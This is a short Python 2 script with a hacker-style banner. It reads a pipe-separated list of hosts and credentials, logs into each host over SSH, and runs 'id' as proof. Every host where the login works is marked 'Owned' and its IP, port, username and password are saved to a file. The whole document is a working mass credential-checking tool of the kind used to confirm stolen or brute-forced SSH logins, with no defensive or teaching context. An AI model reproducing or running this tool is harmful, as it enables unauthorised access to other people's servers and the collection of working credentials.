# -*- coding: utf-8 -*-
import paramiko, sys
from socket import *

cmd='id'

def yukin0shita(target, username, password):
	try:
		targetIP = gethostbyname(target)
	except:
		print target+': \033[31;1mINVALID IP\033[0m'
		return False
	for i in [22]:
		s = socket(AF_INET, SOCK_STREAM)
		s.settimeout(0.5)
		result = s.connect_ex((targetIP, i))
		if(result == 0) :
			check(targetIP, 22, username, password, cmd)
		else:
			print targetIP+'  %d: %s' % (i, '\033[31;1mDIE\033[0m')
		s.close()

def check(ip, port, username, password, cmd):
	try:
		ssh=paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,port,username,password, timeout=5)
		stdin,stdout,stderr=ssh.exec_command(cmd)
		outlines=stdout.readlines()
		resp=''.join(outlines)
		if resp:
			if "\n" in resp:
				resp = resp.replace("\n","")
			print(ip+" - \033[32;1mOwned\033[0m - "),
			print("\033[32mStdout:\033[0m "+str(resp))
			save = open('ssh_login.txt', 'a')
			build = str(ip) + '|' + str(port) + '|' + str(username) + '|' + str(password) + '\n'
			save.write(build)
			save.close()
	except:
		print(ip+" - \033[31mFailed\033[0m")

print('''
                __   _                  __    _ __       
   __  ____  __/ /__(_)___  ____  _____/ /_  (_) /_____ _
  / / / / / / / //_/ / __ \/ __ \/ ___/ __ \/ / __/ __ `/
 / /_/ / /_/ / ,< / / / / / /_/ (__  ) / / / / /_/ /_/ / 
 \__, /\__,_/_/|_/_/_/ /_/\____/____/_/ /_/_/\__/\__,_/  
/____/       make with full ♡ by kita semua~            
\n''')
try:
	listip = open(sys.argv[1]).read()
except:
	exit()
for yuki in listip.splitlines():
	prepare = yuki.split('|')
	try:
		if "://" in prepare[0]:
			host = prepare[0].split('://')[1]
		else:
			host = prepare[0]
		user = prepare[3]
		password = prepare[4]
	except:
		continue
	yukin0shita(host, user, password)
